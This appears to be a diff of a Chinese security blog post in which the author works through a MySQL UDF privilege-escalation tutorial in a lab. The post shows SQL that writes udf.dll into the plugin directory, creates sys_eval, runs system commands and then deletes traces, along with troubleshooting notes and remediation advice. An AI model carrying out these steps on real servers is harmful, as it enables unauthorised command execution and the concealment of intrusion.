+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925210437927.png" alt="image-20230925210437927"></p>
 <p>做到这里突然蒙蔽了，跟着文章做的，但是这里似乎又重复上传了一下，不理解是干嘛的。</p>
 <p>我认为在5.1.5步骤之后应该是没有办法直接将udf文件传到plugin目录下的时候所应该有的，而该作者在5.1.5之前就已经靠sql语句写入到了plugin目录下，到这儿应该就是成功了吧，我不理解他的布局了，估计是混乱了</p>
 <p><strong>5.1.3 查看 plugin 目录，不存在 lib\plugin目录但有webshell，可使用webshell创建lib\plugin目录。</strong></p>
@@ -607,1010 +299,520 @@ Delete_priv: Y<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <p>ADS文件流是NTFS文件系统为了能与Mac系统下的HFS文件系统兼容而设计出的。</p>
 <p>经实践在命令提示符下使用ADS文件流是可以成功创建目录或者文件名的，但在独立安装的mysql数据库环境与phpstudy自带mysql环境下均创建失败，并且查阅网上各种文章也都是没有利用成功的，严重怀疑是哪位小可爱臆想出来的，但为了文章完整性还是决定写出来。</p>
 <p>可见没有webshell几乎不可能了</p>
-<pre class="line-numbers language-none"><code class="language-none">echo 123 &gt;C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925213019476.png" alt="image-20230925213019476"></p>
+<pre><code class="hljs plaintext">echo 123 &gt;C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925213019476.png" alt="image-20230925213019476"></p>
 <p>如上图cmd下提示创建lib目录成功</p>
-<pre class="line-numbers language-none"><code class="language-none">select "123" into dumpfile "C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925213258213.png" alt="image-20230925213258213"></p>
+<pre><code class="hljs plaintext">select "123" into dumpfile "C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION";</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925213258213.png" alt="image-20230925213258213"></p>
 <p>数据库下报错</p>
-<h4 id="5-2-mysql小于5-1版本时：">5.2 mysql小于5.1版本时：</h4>
+<h4 id="52-mysql小于51版本时">5.2 mysql小于5.1版本时：</h4>
 <p><strong>5.2.1 有webshell时，通过webshell上传udf文件。</strong></p>
 <p><strong>5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件。</strong></p>
-<h3 id="6、创建命令执行函数">6、创建命令执行函数</h3>
+<h3 id="6-创建命令执行函数">6、创建命令执行函数</h3>
 <p>使用winhex打开udf文件，在最下方可以看到udf文件提供的函数。</p>
-<p><img src="image-20230925212003551.png" alt="image-20230925212003551"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212003551.png" alt="image-20230925212003551"></p>
 <p>sys_eval，执行任意系统命令，并将输出返回。</p>
 <p>sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925212222362.png" alt="image-20230925212222362"></p>
-<h3 id="7、命令执行">7、命令执行</h3>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925212342687.png" alt="image-20230925212342687"></p>
+<pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">'udf.dll'</span>;</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212222362.png" alt="image-20230925212222362"></p>
+<h3 id="7-命令执行">7、命令执行</h3>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval("whoami");</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212342687.png" alt="image-20230925212342687"></p>
 <p>可以将上述步骤简单总结一下：</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">注意先指定数据库
-<span class="token number">1.</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> udftmp <span class="token punctuation">(</span>c <span class="token keyword">blob</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</span>
-<span class="token number">2.</span> <span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> udftmp <span class="token keyword">values</span><span class="token punctuation">(</span>unhex<span class="token punctuation">(</span><span class="token string">'udf文件的16进制格式'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//在udftmp中写入udf文件内容(udf.txt的内容)</span>
-<span class="token number">3.</span> <span class="token keyword">SELECT</span> c <span class="token keyword">FROM</span> udftmp <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">'D:\\labwork\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span><span class="token punctuation">;</span> <span class="token comment">//将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改</span>
-<span class="token comment">//对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="2-6-痕迹清除">2.6 痕迹清除</h2>
-<h3 id="2-6-1-删除表">2.6.1 删除表</h3>
-<pre class="line-numbers language-none"><code class="language-none">drop table udf;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="2-6-2-删除函数">2.6.2 删除函数</h3>
-<pre class="line-numbers language-none"><code class="language-none">drop function sys_eval;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925212506400.png" alt="image-20230925212506400"></p>
-<h2 id="2-7-其他问题">2.7 其他问题</h2>
-<h3 id="1、ERROR-1125-HY000">1、ERROR 1125 (HY000)</h3>
+<pre><code class="hljs sql">注意先指定数据库
+<span class="hljs-number">1.</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> udftmp (c <span class="hljs-type">blob</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。
+<span class="hljs-number">2.</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> udftmp <span class="hljs-keyword">values</span>(unhex(<span class="hljs-string">'udf文件的16进制格式'</span>)); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>在udftmp中写入udf文件内容(udf.txt的内容)
+<span class="hljs-number">3.</span> <span class="hljs-keyword">SELECT</span> c <span class="hljs-keyword">FROM</span> udftmp <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">'D:\\labwork\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>将udf文件内容传入新建的udf文件中，路径根据自己的@<span class="hljs-variable">@basedir</span>修改
+<span class="hljs-operator">/</span><span class="hljs-operator">/</span>对于mysql小于<span class="hljs-number">5.1</span>的，导出目录为C:\Windows\或C:\Windows\System32\</code></pre>
+<h2 id="26-痕迹清除">2.6 痕迹清除</h2>
+<h3 id="261-删除表">2.6.1 删除表</h3>
+<pre><code class="hljs plaintext">drop table udf;</code></pre>
+<h3 id="262-删除函数">2.6.2 删除函数</h3>
+<pre><code class="hljs plaintext">drop function sys_eval;</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212506400.png" alt="image-20230925212506400"></p>
+<h2 id="27-其他问题">2.7 其他问题</h2>
+<h3 id="1-error-1125-hy000">1、ERROR 1125 (HY000)</h3>
 <p><code>Function 'sys_eval' already exists</code></p>
 <p>提示sys_eval 函数已经存在，可能已经被利用过了，尝试直接调用函数。  这里借用别人的图解了</p>
-<p><img src="image-20230925212544397.png" alt="image-20230925212544397"></p>
-<h3 id="2、提示sys-eval-函数已经存在，但无法利用">2、提示sys_eval 函数已经存在，但无法利用</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212544397.png" alt="image-20230925212544397"></p>
+<h3 id="2-提示sys_eval-函数已经存在但无法利用">2、提示sys_eval 函数已经存在，但无法利用</h3>
 <p>尝试将udf提权相关的利用函数进行删除后重新创建</p>
-<h3 id="3、创建sys-eval-函数时提示已经存在，但利用与删除时提示-sys-eval">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</h3>
+<h3 id="3-创建sys_eval-函数时提示已经存在但利用与删除时提示-sys_eval">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</h3>
 <p>函数不存在（实战无法解决，漏洞复现可以）。**</p>
 <p>原因是上一个人利用过后，数据库进行了重启。</p>
-<p><img src="image-20230925212649664.png" alt="image-20230925212649664"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925212649664.png" alt="image-20230925212649664"></p>
 <p>之后重启mysqld服务器，再创建就可以了。</p>
-<h3 id="4、ERROR-1126-HY000">4、ERROR 1126 (HY000)</h3>
+<h3 id="4-error-1126-hy000">4、ERROR 1126 (HY000)</h3>
 <p><code>Can't open shared library 'udf.dll' (errno: 193 )</code></p>
 <p>在进行udf提权时碰到这个错误一般是ufd文件位数选择错误，尝试另一个位数的udf文件。</p>
-<h2 id="2-8-修复建议">2.8 修复建议</h2>
-<pre class="line-numbers language-none"><code class="language-none">1、mysql配置文件中secure_file_priv项设置为NULL或非 mysql/lib/plugin目录。
+<h2 id="28-修复建议">2.8 修复建议</h2>
+<pre><code class="hljs plaintext">1、mysql配置文件中secure_file_priv项设置为NULL或非 mysql/lib/plugin目录。
 
-2、数据库用户确保正确实施最小权限原则。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h1>0x03 Linux-UDF提权</h1>
+2、数据库用户确保正确实施最小权限原则。</code></pre>
+<h1 id="0x03-linux-udf提权">0x03 Linux-UDF提权</h1>
 <p>Linux环境下的UDF提权大概率仅限于靶场环境中，原因：</p>
 <p>在Linux严格的系统权限下，mysql用户或web用户无plugin目录的写入权限。</p>
-<p><img src="image-20230925213925995.png" alt="image-20230925213925995"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925213925995.png" alt="image-20230925213925995"></p>
 <p>Linux环境下的udf提权除利用条件外与Windows环境下完全相同。</p>
 <p>利用条件：除windows篇中的内容外，还需要plugin目录的写入权限。</p>
 <p>因此这里我也找文章复现了，只能说遇到的话在研究吧。</p>
 <p>下次学习一番逃逸restricted shell，但似乎这类文章不好找┭┮﹏┭┮</p>
-<h1>0x04 参考文章</h1>
+<h1 id="0x04-参考文章">0x04 参考文章</h1>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16245486.html">[mysql udf提权 ]</a>  --webshell+udf提权可以看这篇</p>
 
-                
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/">http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">hybcx</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/">
-                                    <span class="chip bg-color">数据库提权系列</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+<div class="article-footer slide-up fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
 </div>
-
-                </div>
-            </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">随缘，看各位佬的心情</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
-</div>
-
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
-        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
-        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'false' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
-<!--酷Q推送-->
-
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2023/09/27/linux-ti-quan-xue-xi-yi/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Linux提权学习之rbash逃逸">
-                        
-                        <span class="card-title">Linux提权学习之rbash逃逸</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-27
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Linux%E6%8F%90%E6%9D%83/">
-                        <span class="chip bg-color">Linux提权</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/09/24/kioptrix-level-1.3/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="vulnhub-kioptrix_level 1.3">
-                        
-                        <span class="card-title">vulnhub-kioptrix_level 1.3</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-24
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/vulnhub%E7%B3%BB%E5%88%97/" class="post-category">
-                                    vulnhub系列
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">内网靶场</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
+    </section>
     </div>
 </article>
+<div class="related-wrap slide-up" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/09/27/linux-ti-quan-xue-xi-yi/">Linux提权学习之rbash逃逸</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/09/24/kioptrix-level-1.3/">vulnhub-kioptrix_level 1.3</a></div></section></div>
 
+<div class="related-wrap slide-up" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\09\27\linux-ti-quan-xue-xi-yi\" title="Linux提权学习之rbash逃逸"><span class="title">Linux提权学习之rbash逃逸</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text slide-up" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer slide-up footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
